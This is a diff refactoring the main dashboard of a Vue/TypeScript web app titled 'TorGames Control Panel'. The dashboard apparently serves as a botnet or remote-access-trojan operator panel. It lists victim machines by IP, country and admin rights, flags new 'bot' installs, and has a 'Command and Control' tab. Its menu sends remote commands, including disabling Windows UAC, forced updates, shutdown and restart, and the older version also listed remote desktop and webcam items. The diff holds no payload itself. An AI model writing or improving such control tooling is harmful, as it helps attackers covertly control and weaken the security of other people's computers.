@@ -1,17 +1,17 @@
 <script setup lang="ts">
 import { ref, computed, onMounted, onUnmounted } from 'vue'
-import { useRouter } from 'vue-router'
+
 import { useAuthStore } from '@/stores/auth'
 import { useClientsStore } from '@/stores/clients'
 import { useSettingsStore } from '@/stores/settings'
 import { signalRService } from '@/services/signalr'
 import { getVersions } from '@/services/api'
+import MainLayout from '@/layouts/MainLayout.vue'
 import ClientManagerDialog from '@/components/ClientManagerDialog.vue'
 import VersionManagement from '@/components/VersionManagement.vue'
 import type { ClientDto } from '@/types/client'
 import type { VersionInfo } from '@/types/version'
 
-const router = useRouter()
 const authStore = useAuthStore()
 const clientsStore = useClientsStore()
 const settingsStore = useSettingsStore()
@@ -63,6 +63,7 @@ interface DisplayClient {
   firstSeen: string
   lastSeen: string
   status: 'online' | 'offline'
+  countryCode: string
   raw: ClientDto
 }
 
@@ -93,7 +94,7 @@ const transformClient = (client: ClientDto): DisplayClient => {
     const hours = Math.floor(minutes / 60)
     const days = Math.floor(hours / 24)
 
-    if (days > 0) return `${days}D ${hours % 24}H ${minutes % 60}M`
+    if (days > 0) return `${days}D ${hours % 24}H`
     if (hours > 0) return `${hours}H ${minutes % 60}M`
     if (minutes > 0) return `${minutes}M`
     return `${seconds}s`
@@ -121,6 +122,7 @@ const transformClient = (client: ClientDto): DisplayClient => {
     firstSeen: formatDuration(now.getTime() - connectedDate.getTime()),
     lastSeen: lastSeenText,
     status: client.isOnline ? 'online' : 'offline',
+    countryCode: client.countryCode?.toLowerCase() || 'xx',
     raw: client
   }
 }
@@ -140,24 +142,17 @@ const sortedClients = computed(() => {
 })
 
 const headers = [
-  { title: 'Client ID', key: 'clientId', sortable: true },
-  { title: 'Version', key: 'version', sortable: true, width: '140px' },
-  { title: 'IP Address', key: 'ipAddress', sortable: true },
+  { title: 'Status', key: 'status', sortable: true, width: '80px', align: 'center' },
   { title: 'Machine Name', key: 'machineName', sortable: true },
-  { title: 'Operating System', key: 'operatingSystem', sortable: true },
-  { title: 'Admin', key: 'isAdmin', sortable: true, width: '70px' },
-  { title: 'CPUs', key: 'cpus', sortable: true, width: '60px' },
-  { title: 'Type', key: 'type', sortable: true, width: '90px' },
-  { title: 'First Seen', key: 'firstSeen', sortable: true },
-  { title: 'Last Seen', key: 'lastSeen', sortable: true },
+  { title: 'IP Address', key: 'ipAddress', sortable: true },
+  { title: 'OS', key: 'operatingSystem', sortable: true },
+  { title: 'Version', key: 'version', sortable: true, width: '120px' },
+  { title: 'Admin', key: 'isAdmin', sortable: true, width: '80px', align: 'center' },
+  { title: 'Last Seen', key: 'lastSeen', sortable: true, align: 'end' },
 ]
 
-const onlineCount = computed(() => clientsStore.onlineCount)
-const totalCount = computed(() => clientsStore.clientCount)
-const selectedCount = computed(() => selectedClients.value.length)
 const isConnected = computed(() => clientsStore.isConnected)
 const isConnecting = computed(() => clientsStore.isConnecting)
-const isReconnecting = computed(() => clientsStore.isReconnecting)
 
 const showContextMenu = (e: MouseEvent, item: DisplayClient) => {
   e.preventDefault()
@@ -173,19 +168,10 @@ const showContextMenu = (e: MouseEvent, item: DisplayClient) => {
   contextMenu.value = true
 }
 
-// Row class for styling different client types - can be used with v-data-table's :row-props
-function getRowClass(item: DisplayClient): string {
-  if (item.type === 'INSTALLER') return 'new-bot-row'
-  return ''
-}
-
-// Export to avoid unused variable warning (can be used in template)
-defineExpose({ getRowClass })
-
-async function handleLogout() {
-  await clientsStore.disconnect()
-  await authStore.logout()
-  router.push({ name: 'login' })
+// Row class for styling different client types
+function getRowClass(data: { item: DisplayClient }): string | undefined {
+  if (data.item.type === 'INSTALLER') return 'new-bot-row'
+  return undefined
 }
 
 async function connectToServer() {
@@ -203,10 +189,6 @@ async function refreshClients() {
   }
 }
 
-function toggleNotifications() {
-  settingsStore.setNotificationsEnabled(!settingsStore.notificationsEnabled)
-}
-
 function openClientManager() {
   if (contextMenuClient.value) {
     clientManagerClient.value = contextMenuClient.value
@@ -217,9 +199,7 @@ function openClientManager() {
 
 async function disableUac() {
   if (!contextMenuClient.value) return
-
   contextMenu.value = false
-
   try {
     const command = {
       connectionKey: contextMenuClient.value.connectionKey,
@@ -227,48 +207,20 @@ async function disableUac() {
       commandText: '',
       timeoutSeconds: 10
     }
-
     const success = await signalRService.executeCommand(command)
-
-    if (success) {
-      snackbar.value = {
-        show: true,
-        message: `Disable UAC command sent to ${contextMenuClient.value.machineName}`,
-        color: 'success'
-      }
-    } else {
-      snackbar.value = {
-        show: true,
-        message: `Failed to send Disable UAC command to ${contextMenuClient.value.machineName}`,
-        color: 'error'
-      }
-    }
+    showSnackbar(success ? `Disable UAC command sent` : `Failed to send Disable UAC command`, success ? 'success' : 'error')
   } catch (e) {
-    snackbar.value = {
-      show: true,
-      message: e instanceof Error ? e.message : 'Failed to disable UAC',
-      color: 'error'
-    }
+    showSnackbar(e instanceof Error ? e.message : 'Failed to disable UAC', 'error')
   }
 }
 
-async function shutdownClient() {
-  await sendPowerCommand('shutdown', 'Shut Down')
-}
-
-async function restartClient() {
-  await sendPowerCommand('restart', 'Restart')
-}
-
-async function signOutClient() {
-  await sendPowerCommand('signout', 'Sign Out')
-}
+async function shutdownClient() { await sendPowerCommand('shutdown', 'Shut Down') }
+async function restartClient() { await sendPowerCommand('restart', 'Restart') }
+async function signOutClient() { await sendPowerCommand('signout', 'Sign Out') }
 
 async function sendPowerCommand(commandType: string, actionName: string) {
   if (!contextMenuClient.value) return
-
   contextMenu.value = false
-
   try {
     const command = {
       connectionKey: contextMenuClient.value.connectionKey,
@@ -276,42 +228,18 @@ async function sendPowerCommand(commandType: string, actionName: string) {
       commandText: '',
       timeoutSeconds: 10
     }
-
     const success = await signalRService.executeCommand(command)
-
-    if (success) {
-      snackbar.value = {
-        show: true,
-        message: `${actionName} command sent to ${contextMenuClient.value.machineName}`,
-        color: 'success'
-      }
-    } else {
-      snackbar.value = {
-        show: true,
-        message: `Failed to send ${actionName} command to ${contextMenuClient.value.machineName}`,
-        color: 'error'
-      }
-    }
+    showSnackbar(success ? `${actionName} command sent` : `Failed to send ${actionName} command`, success ? 'success' : 'error')
   } catch (e) {
-    snackbar.value = {
-      show: true,
-      message: e instanceof Error ? e.message : `Failed to ${actionName.toLowerCase()}`,
-      color: 'error'
-    }
+    showSnackbar(e instanceof Error ? e.message : `Failed to ${actionName.toLowerCase()}`, 'error')
   }
 }
 
-// Check if selected client is outdated
-const isContextClientOutdated = computed(() => {
-  if (!contextMenuClient.value || !latestVersion.value) return false
-  return isVersionOutdated(contextMenuClient.value.clientVersion || '0.0.0', latestVersion.value)
-})
+
 
 async function forceUpdateClient() {
   if (!contextMenuClient.value) return
-
   contextMenu.value = false
-
   try {
     const command = {
       connectionKey: contextMenuClient.value.connectionKey,
@@ -319,28 +247,10 @@ async function forceUpdateClient() {
       commandText: '',
       timeoutSeconds: 300
     }
-
     const success = await signalRService.executeCommand(command)
-
-    if (success) {
-      snackbar.value = {
-        show: true,
-        message: `Force update command sent to ${contextMenuClient.value.machineName}`,
-        color: 'success'
-      }
-    } else {
-      snackbar.value = {
-        show: true,
-        message: `Failed to send update command to ${contextMenuClient.value.machineName}`,
-        color: 'error'
-      }
-    }
+    showSnackbar(success ? `Force update command sent` : `Failed to send update command`, success ? 'success' : 'error')
   } catch (e) {
-    snackbar.value = {
-      show: true,
-      message: e instanceof Error ? e.message : 'Failed to send update command',
-      color: 'error'
-    }
+    showSnackbar(e instanceof Error ? e.message : 'Failed to send update command', 'error')
   }
 }
 
@@ -348,10 +258,8 @@ async function loadLatestVersion() {
   try {
     const token = authStore.sessionToken
     if (!token) return
-
     const versions = await getVersions(token)
     if (versions.length > 0) {
-      // Versions are sorted descending, so first is latest
       latestVersion.value = versions[0] ?? null
     }
   } catch (e) {
@@ -359,351 +267,226 @@ async function loadLatestVersion() {
   }
 }
 
+function showSnackbar(message: string, color: string = 'success') {
+  snackbar.value = { show: true, message, color }
+}
+
 onMounted(async () => {
-  // Initialize settings
   await settingsStore.initialize()
-  // Load latest version info
   await loadLatestVersion()
-  // Connect to SignalR hub
   await connectToServer()
 })
 
 onUnmounted(async () => {
-  // Disconnect when leaving dashboard
   await clientsStore.disconnect()
 })
 </script>
 
 <template>
-  <v-app>
-    <v-main class="d-flex flex-column main-content">
-      <!-- Header Toolbar with Logout -->
-      <v-toolbar density="compact" color="surface" class="px-2" style="flex: 0 0 auto;">
-        <v-icon class="mr-2">mdi-shield-lock</v-icon>
-        <v-toolbar-title class="text-subtitle-1 font-weight-bold">
-          TorGames Control Panel
-        </v-toolbar-title>
+  <MainLayout v-model:activeTab="activeTab">
+    <!-- Machine List Tab -->
+    <div v-if="activeTab === 'clients'" class="d-flex flex-column fill-height">
+      <!-- Toolbar -->
+      <div class="d-flex align-center mb-4">
+        <v-text-field
+          v-model="search"
+          prepend-inner-icon="mdi-magnify"
+          label="Search clients..."
+          density="compact"
+          variant="outlined"
+          hide-details
+          class="glass-card rounded-lg"
+          style="max-width: 300px"
+          bg-color="transparent"
+        />
         <v-spacer />
-
-        <!-- Connection Status -->
-        <v-chip
-          :color="isConnected ? 'success' : (isConnecting || isReconnecting) ? 'warning' : 'error'"
-          size="small"
-          class="mr-2"
-        >
-          <v-icon start size="small">
-            {{ isConnected ? 'mdi-wifi' : (isConnecting || isReconnecting) ? 'mdi-wifi-strength-1' : 'mdi-wifi-off' }}
-          </v-icon>
-          {{ isConnected ? 'Connected' : isReconnecting ? 'Reconnecting...' : isConnecting ? 'Connecting...' : 'Disconnected' }}
-        </v-chip>
-
-        <!-- Notification Toggle -->
         <v-btn
-          :icon="settingsStore.notificationsEnabled ? 'mdi-bell' : 'mdi-bell-off'"
+          prepend-icon="mdi-refresh"
           variant="text"
-          size="small"
-          :color="settingsStore.notificationsEnabled ? 'primary' : 'grey'"
-          @click="toggleNotifications"
-          class="mr-2"
+          :loading="isConnecting"
+          @click="refreshClients"
+          class="glass-card mr-2"
         >
-          <v-tooltip activator="parent" location="bottom">
-            {{ settingsStore.notificationsEnabled ? 'Disable notifications' : 'Enable notifications' }}
-          </v-tooltip>
+          Refresh
         </v-btn>
-
-        <v-btn
-          variant="text"
-          prepend-icon="mdi-logout"
-          @click="handleLogout"
-        >
-          Logout
+        <v-btn prepend-icon="mdi-filter-variant" variant="text" class="glass-card">
+          Filter
         </v-btn>
-      </v-toolbar>
+      </div>
 
-      <v-divider />
-
-      <!-- Connection Error Alert -->
-      <v-alert
-        v-if="connectionError"
-        type="error"
-        closable
-        density="compact"
-        class="mx-2 mt-2"
-        @click:close="connectionError = null"
+      <!-- Data Table -->
+      <v-data-table
+        v-model="selectedClients"
+        :headers="headers"
+        :items="sortedClients"
+        :items-per-page="-1"
+        :search="search"
+        item-value="id"
+        show-select
+        density="comfortable"
+        hover
+        fixed-header
+        hide-default-footer
+        :row-props="getRowClass"
+        class="clients-table flex-grow-1 bg-transparent"
+        @contextmenu:row="(e: any, { item }: any) => showContextMenu(e, item)"
       >
-        {{ connectionError }}
-        <template #append>
-          <v-btn variant="text" size="small" @click="connectToServer">Retry</v-btn>
+        <!-- Status Column with Country Flag -->
+        <template #item.status="{ item }">
+          <div class="d-flex align-center justify-center ga-2">
+            <img
+              v-if="item.countryCode && item.countryCode !== 'xx'"
+              :src="`/flags/${item.countryCode}.svg`"
+              :alt="item.countryCode.toUpperCase()"
+              :title="item.countryCode.toUpperCase()"
+              class="country-flag"
+              @error="($event.target as HTMLImageElement).style.display = 'none'"
+            />
+            <v-badge
+              dot
+              :color="item.status === 'online' ? 'success' : 'grey'"
+              location="bottom end"
+              offset-x="2"
+              offset-y="2"
+            >
+              <v-avatar size="28" :color="item.status === 'online' ? 'rgba(34, 197, 94, 0.1)' : 'rgba(148, 163, 184, 0.1)'">
+                <v-icon :icon="item.type === 'INSTALLER' ? 'mdi-robot' : 'mdi-monitor'" size="16" :color="item.status === 'online' ? 'success' : 'grey'"></v-icon>
+              </v-avatar>
+            </v-badge>
+          </div>
         </template>
-      </v-alert>
 
-      <!-- Tabs -->
-      <v-tabs v-model="activeTab" bg-color="surface" density="compact" grow style="flex: 0 0 auto;">
-        <v-tab value="clients" prepend-icon="mdi-monitor-multiple">
-          MACHINE LIST
-        </v-tab>
-        <v-tab value="command" prepend-icon="mdi-console">
-          COMMAND AND CONTROL
-        </v-tab>
-        <v-tab value="config" prepend-icon="mdi-cog">
-          STATION CONFIGURATION
-        </v-tab>
-        <v-tab value="data" prepend-icon="mdi-database">
-          SAVED DATA
-        </v-tab>
-        <v-tab value="server" prepend-icon="mdi-server">
-          SERVER MANAGEMENT
-        </v-tab>
-      </v-tabs>
+        <!-- Machine Name -->
+        <template #item.machineName="{ item }">
+          <div class="font-weight-medium">{{ item.machineName }}</div>
+          <div class="text-caption text-medium-emphasis">{{ item.clientId }}</div>
+        </template>
 
-      <v-divider />
+        <!-- OS -->
+        <template #item.operatingSystem="{ item }">
+          <div class="d-flex align-center">
+            <v-icon
+              :icon="item.operatingSystem.toLowerCase().includes('windows') ? 'mdi-microsoft-windows' : 'mdi-linux'"
+              size="small"
+              class="mr-2 text-medium-emphasis"
+            ></v-icon>
+            {{ item.operatingSystem }}
+          </div>
+        </template>
 
-      <!-- Tab Content -->
-      <v-window v-model="activeTab" class="flex-grow-1" style="overflow: hidden; min-height: 0;">
-        <!-- Machine List Tab -->
-        <v-window-item value="clients" class="fill-height" style="overflow: hidden;">
-          <v-data-table
-            v-model="selectedClients"
-            :headers="headers"
-            :items="sortedClients"
-            :items-per-page="-1"
-            :search="search"
-            item-value="id"
-            show-select
-            density="compact"
-            hover
-            fixed-header
-            hide-default-footer
-            class="clients-table fill-height"
-            @contextmenu:row="(e: any, { item }: any) => showContextMenu(e, item)"
+        <!-- Version -->
+        <template #item.version="{ item }">
+          <v-chip
+            size="small"
+            :color="item.isOutdated ? 'error' : 'surface-variant'"
+            variant="flat"
+            class="font-weight-medium"
           >
-            <template #top>
-              <v-toolbar density="compact" color="transparent">
-                <v-text-field
-                  v-model="search"
-                  prepend-inner-icon="mdi-magnify"
-                  label="Search clients..."
-                  density="compact"
-                  variant="outlined"
-                  hide-details
-                  clearable
-                  class="mx-2"
-                  style="max-width: 300px"
-                />
-                <v-spacer />
-                <v-btn-group density="compact" variant="outlined">
-                  <v-btn prepend-icon="mdi-refresh" :loading="isConnecting" @click="refreshClients">
-                    Refresh
-                  </v-btn>
-                  <v-btn prepend-icon="mdi-filter">Filter</v-btn>
-                </v-btn-group>
-              </v-toolbar>
-            </template>
+            {{ item.version }}
+            <v-icon v-if="item.isOutdated" end icon="mdi-alert-circle" size="small"></v-icon>
+          </v-chip>
+        </template>
 
-            <!-- Empty state -->
-            <template #no-data>
-              <div class="d-flex flex-column align-center justify-center pa-8">
-                <v-icon size="64" color="grey" class="mb-4">mdi-monitor-off</v-icon>
-                <div class="text-h6 text-grey mb-2">No Clients Connected</div>
-                <div class="text-body-2 text-grey mb-4">
-                  {{ isConnected ? 'Waiting for clients to connect...' : 'Connect to the server to see clients' }}
-                </div>
-                <v-btn
-                  v-if="!isConnected"
-                  color="primary"
-                  prepend-icon="mdi-refresh"
-                  :loading="isConnecting"
-                  @click="connectToServer"
-                >
-                  Connect to Server
-                </v-btn>
-              </div>
-            </template>
+        <!-- Admin -->
+        <template #item.isAdmin="{ item }">
+          <div class="d-flex justify-center">
+            <v-icon v-if="item.isAdmin" icon="mdi-shield-check" color="primary" size="small"></v-icon>
+          </div>
+        </template>
 
-            <template #item.clientId="{ item }">
-              <div class="d-flex align-center">
-                <v-icon
-                  :color="item.status === 'online' ? 'success' : 'grey'"
-                  size="small"
-                  class="mr-2"
-                >
-                  mdi-circle
-                </v-icon>
-                {{ item.clientId }}
-              </div>
-            </template>
+        <!-- Last Seen -->
+        <template #item.lastSeen="{ item }">
+          <span :class="item.lastSeen === 'Online Now' ? 'text-success font-weight-medium' : 'text-medium-emphasis'">
+            {{ item.lastSeen }}
+          </span>
+        </template>
 
-            <template #item.version="{ item }">
-              <div class="d-flex align-center">
-                <span :class="item.isOutdated ? 'text-warning' : ''">{{ item.version }}</span>
-                <v-icon
-                  v-if="item.isOutdated"
-                  color="warning"
-                  size="small"
-                  class="ml-1"
-                >
-                  mdi-alert-circle
-                  <v-tooltip activator="parent" location="top">Update available</v-tooltip>
-                </v-icon>
-              </div>
-            </template>
+        <!-- Empty State -->
+        <template #no-data>
+          <div class="d-flex flex-column align-center justify-center pa-12">
+            <v-icon size="64" color="grey-darken-2" class="mb-4">mdi-monitor-off</v-icon>
+            <div class="text-h6 text-grey mb-2">No Clients Connected</div>
+            <div class="text-body-2 text-grey mb-6">
+              {{ isConnected ? 'Waiting for clients to connect...' : 'Connect to the server to see clients' }}
+            </div>
+            <v-btn
+              v-if="!isConnected"
+              color="primary"
+              prepend-icon="mdi-wifi"
+              :loading="isConnecting"
+              @click="connectToServer"
+              class="px-6"
+            >
+              Connect to Server
+            </v-btn>
+          </div>
+        </template>
+      </v-data-table>
+    </div>
 
-            <template #item.isAdmin="{ item }">
-              <v-icon
-                :color="item.isAdmin ? 'success' : 'error'"
-                size="small"
-              >
-                {{ item.isAdmin ? 'mdi-check' : 'mdi-close' }}
-              </v-icon>
-            </template>
+    <!-- Other tabs placeholders -->
+    <div v-else-if="activeTab === 'command'" class="fill-height d-flex align-center justify-center">
+      <div class="text-center">
+        <v-icon size="64" color="surface-variant" class="mb-4">mdi-console-line</v-icon>
+        <div class="text-h5 font-weight-light text-medium-emphasis">Command & Control</div>
+        <div class="text-caption text-disabled mt-2">Module under construction</div>
+      </div>
+    </div>
 
-            <template #item.type="{ item }">
-              <v-chip
-                :color="item.type === 'INSTALLER' ? 'info' : item.type === 'CLIENT' ? 'success' : 'default'"
-                size="small"
-                variant="tonal"
-              >
-                {{ item.type }}
-              </v-chip>
-            </template>
+    <div v-else-if="activeTab === 'config'" class="fill-height d-flex align-center justify-center">
+      <div class="text-center">
+        <v-icon size="64" color="surface-variant" class="mb-4">mdi-cog-box</v-icon>
+        <div class="text-h5 font-weight-light text-medium-emphasis">Station Configuration</div>
+        <div class="text-caption text-disabled mt-2">Module under construction</div>
+      </div>
+    </div>
 
-            <template #item.lastSeen="{ item }">
-              <span :class="item.lastSeen === 'Online Now' ? 'text-success' : ''">
-                {{ item.lastSeen }}
-              </span>
-            </template>
-          </v-data-table>
-        </v-window-item>
+    <div v-else-if="activeTab === 'data'" class="fill-height d-flex align-center justify-center">
+      <div class="text-center">
+        <v-icon size="64" color="surface-variant" class="mb-4">mdi-database-outline</v-icon>
+        <div class="text-h5 font-weight-light text-medium-emphasis">Saved Data</div>
+        <div class="text-caption text-disabled mt-2">Module under construction</div>
+      </div>
+    </div>
 
-        <!-- Other tabs placeholder -->
-        <v-window-item value="command" class="fill-height pa-4">
-          <v-card class="fill-height d-flex align-center justify-center">
-            <v-card-text class="text-center">
-              <v-icon size="64" color="grey">mdi-console</v-icon>
-              <div class="text-h6 mt-4 text-grey">Command and Control</div>
-              <div class="text-body-2 text-grey">Coming soon...</div>
-            </v-card-text>
-          </v-card>
-        </v-window-item>
-
-        <v-window-item value="config" class="fill-height pa-4">
-          <v-card class="fill-height d-flex align-center justify-center">
-            <v-card-text class="text-center">
-              <v-icon size="64" color="grey">mdi-cog</v-icon>
-              <div class="text-h6 mt-4 text-grey">Station Configuration</div>
-              <div class="text-body-2 text-grey">Coming soon...</div>
-            </v-card-text>
-          </v-card>
-        </v-window-item>
-
-        <v-window-item value="data" class="fill-height pa-4">
-          <v-card class="fill-height d-flex align-center justify-center">
-            <v-card-text class="text-center">
-              <v-icon size="64" color="grey">mdi-database</v-icon>
-              <div class="text-h6 mt-4 text-grey">Saved Data</div>
-              <div class="text-body-2 text-grey">Coming soon...</div>
-            </v-card-text>
-          </v-card>
-        </v-window-item>
-
-        <v-window-item value="server" class="fill-height">
-          <VersionManagement />
-        </v-window-item>
-      </v-window>
-
-      <!-- Status Bar -->
-      <v-footer height="32" color="surface" class="px-4 border-t" style="flex: 0 0 32px; min-height: 32px;">
-        <v-icon size="small" color="success" class="mr-1">mdi-circle</v-icon>
-        <span class="text-body-2 mr-4">Clients Online: {{ onlineCount }}</span>
-
-        <v-icon size="small" color="primary" class="mr-1">mdi-cursor-default-click</v-icon>
-        <span class="text-body-2 mr-4">Clients Selected: {{ selectedCount }}</span>
-
-        <v-icon size="small" color="grey" class="mr-1">mdi-sigma</v-icon>
-        <span class="text-body-2">Total Clients: {{ totalCount }}</span>
-
-        <v-spacer />
-
-        <v-btn variant="text" size="small" prepend-icon="mdi-access-point">
-          Port Management / Listen on Ports
-          <v-icon end size="small">mdi-menu-down</v-icon>
-        </v-btn>
-      </v-footer>
-    </v-main>
+    <div v-else-if="activeTab === 'server'" class="fill-height">
+      <VersionManagement />
+    </div>
 
     <!-- Context Menu -->
-    <v-overlay
+    <v-menu
       v-model="contextMenu"
-      :scrim="false"
-      class="context-menu-overlay"
-      @click="contextMenu = false"
+      :style="{ position: 'fixed', left: contextMenuX + 'px', top: contextMenuY + 'px' }"
+      location-strategy="connected"
     >
-      <v-card
-        class="context-menu-card"
-        :style="{ position: 'fixed', left: contextMenuX + 'px', top: contextMenuY + 'px' }"
-        @click.stop
-      >
-        <v-list density="compact" nav>
-          <v-list-item v-if="contextMenuClient" class="context-menu-header">
-            <template #prepend>
-              <v-icon :color="contextMenuClient.isOnline ? 'success' : 'grey'" size="small">mdi-circle</v-icon>
-            </template>
-            <v-list-item-title class="font-weight-bold">{{ contextMenuClient.machineName }}</v-list-item-title>
-            <v-list-item-subtitle>{{ contextMenuClient.ipAddress }}</v-list-item-subtitle>
-          </v-list-item>
-          <v-divider class="my-1" />
-          <v-list-item prepend-icon="mdi-monitor" title="Client Manager" @click="openClientManager" />
-          <v-list-item prepend-icon="mdi-shield-off" title="Disable UAC" @click="disableUac" />
-          <v-list-item
-            v-if="isContextClientOutdated"
-            prepend-icon="mdi-update"
-            title="Force Update"
-            @click="forceUpdateClient"
-          >
-            <template #append>
-              <v-chip size="x-small" color="warning" variant="flat">Outdated</v-chip>
-            </template>
-          </v-list-item>
-          <v-divider class="my-1" />
-          <v-list-item prepend-icon="mdi-remote-desktop" title="Remote Desktop" @click="contextMenu = false" />
-          <v-list-item prepend-icon="mdi-webcam" title="Remote Webcam" @click="contextMenu = false" />
-          <v-divider class="my-1" />
-          <v-list-item prepend-icon="mdi-lan" title="Networking" @click="contextMenu = false">
-            <template #append>
-              <v-icon size="small">mdi-chevron-right</v-icon>
-            </template>
-          </v-list-item>
-          <v-menu open-on-hover location="end" :close-on-content-click="false">
-            <template #activator="{ props }">
-              <v-list-item v-bind="props" prepend-icon="mdi-dots-horizontal" title="Miscellaneous">
-                <template #append>
-                  <v-icon size="small">mdi-chevron-right</v-icon>
-                </template>
-              </v-list-item>
-            </template>
-            <v-list density="compact" class="py-0">
-              <v-list-item prepend-icon="mdi-power" title="Shut Down" @click="shutdownClient" />
-              <v-list-item prepend-icon="mdi-restart" title="Restart" @click="restartClient" />
-              <v-list-item prepend-icon="mdi-logout" title="Sign Out" @click="signOutClient" />
-            </v-list>
-          </v-menu>
-          <v-divider class="my-1" />
-          <v-list-item prepend-icon="mdi-information" title="Client General" @click="contextMenu = false">
-            <template #append>
-              <v-icon size="small">mdi-chevron-right</v-icon>
-            </template>
-          </v-list-item>
-          <v-list-item prepend-icon="mdi-content-save" title="Saved Data" @click="contextMenu = false">
-            <template #append>
-              <v-icon size="small">mdi-chevron-right</v-icon>
-            </template>
-          </v-list-item>
-          <v-divider class="my-1" />
-          <v-list-item prepend-icon="mdi-pound" title="Select # of Clients" @click="contextMenu = false" />
-          <v-list-item prepend-icon="mdi-select-all" title="Select All Clients" @click="contextMenu = false" />
-        </v-list>
-      </v-card>
-    </v-overlay>
+      <v-list density="compact" class="glass-panel py-2" width="220">
+        <v-list-item v-if="contextMenuClient" class="mb-2 px-4">
+          <template #prepend>
+            <v-avatar size="24" :color="contextMenuClient.isOnline ? 'success' : 'grey'">
+              <v-icon icon="mdi-monitor" size="14" color="white"></v-icon>
+            </v-avatar>
+          </template>
+          <v-list-item-title class="font-weight-bold">{{ contextMenuClient.machineName }}</v-list-item-title>
+          <v-list-item-subtitle class="text-caption">{{ contextMenuClient.ipAddress }}</v-list-item-subtitle>
+        </v-list-item>
+        
+        <v-divider class="mb-2 border-opacity-25"></v-divider>
+        
+        <v-list-item prepend-icon="mdi-monitor-dashboard" title="Client Manager" @click="openClientManager" />
+        <v-list-item prepend-icon="mdi-shield-off" title="Disable UAC" @click="disableUac" />
+        <v-list-item
+          prepend-icon="mdi-update"
+          title="Manual Update"
+          @click="forceUpdateClient"
+        />
+        
+        <v-divider class="my-2 border-opacity-25"></v-divider>
+        
+        <v-list-item prepend-icon="mdi-power" title="Shut Down" @click="shutdownClient" class="text-error" />
+        <v-list-item prepend-icon="mdi-restart" title="Restart" @click="restartClient" class="text-warning" />
+        <v-list-item prepend-icon="mdi-logout" title="Sign Out" @click="signOutClient" />
+      </v-list>
+    </v-menu>
 
     <!-- Client Manager Dialog -->
     <ClientManagerDialog
@@ -711,77 +494,41 @@ onUnmounted(async () => {
       :client="clientManagerClient"
     />
 
-    <!-- Snackbar for notifications -->
-    <v-snackbar v-model="snackbar.show" :color="snackbar.color" :timeout="3000">
+    <!-- Snackbar -->
+    <v-snackbar v-model="snackbar.show" :color="snackbar.color" :timeout="3000" location="bottom right">
       {{ snackbar.message }}
     </v-snackbar>
-  </v-app>
+  </MainLayout>
 </template>
 
 <style scoped>
-.main-content {
-  height: 100vh !important;
-  max-height: 100vh !important;
-  min-height: 0 !important;
-  overflow: hidden !important;
-  padding: 0 !important;
-}
-
-.main-content :deep(.v-main__wrap) {
-  display: flex !important;
-  flex-direction: column !important;
-  height: 100% !important;
-  max-height: 100% !important;
-  overflow: hidden !important;
-  padding: 0 !important;
-}
-
-.clients-table {
-  display: flex !important;
-  flex-direction: column !important;
-  overflow: hidden !important;
-  height: 100% !important;
-  max-height: 100% !important;
-}
-
 .clients-table :deep(.v-table__wrapper) {
-  flex: 1 1 0 !important;
-  min-height: 0 !important;
-  overflow-y: auto !important;
+  overflow-y: auto;
 }
 
-.clients-table :deep(.v-data-table__tr:hover) {
-  background-color: rgba(var(--v-theme-primary), 0.1) !important;
+.clients-table :deep(thead tr th) {
+  background: transparent !important;
+  color: rgba(255, 255, 255, 0.7) !important;
+  font-weight: 600;
+  text-transform: uppercase;
+  font-size: 0.75rem;
+  letter-spacing: 0.05em;
+  border-bottom: 1px solid rgba(255, 255, 255, 0.1) !important;
 }
 
-.clients-table :deep(.v-data-table__tr--selected) {
-  background-color: rgba(var(--v-theme-primary), 0.2) !important;
+.clients-table :deep(tbody tr:hover) {
+  background: rgba(255, 255, 255, 0.03) !important;
 }
 
 .new-bot-row {
-  background-color: rgba(var(--v-theme-info), 0.1);
+  background: rgba(59, 130, 246, 0.1);
 }
 
-.context-menu-overlay {
-  align-items: flex-start !important;
-  justify-content: flex-start !important;
-}
-
-.context-menu-card {
-  z-index: 9999;
-  min-width: 280px;
-}
-
-.context-menu-card :deep(.v-list-item) {
-  cursor: pointer;
-}
-
-.context-menu-card :deep(.v-list-item:hover:not(.context-menu-header)) {
-  background-color: rgba(var(--v-theme-primary), 0.1);
-}
-
-.context-menu-header {
-  pointer-events: none;
-  background-color: rgba(var(--v-theme-surface-variant), 0.3);
+.country-flag {
+  width: 22px;
+  height: 16px;
+  border-radius: 2px;
+  object-fit: cover;
+  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
 }
 </style>
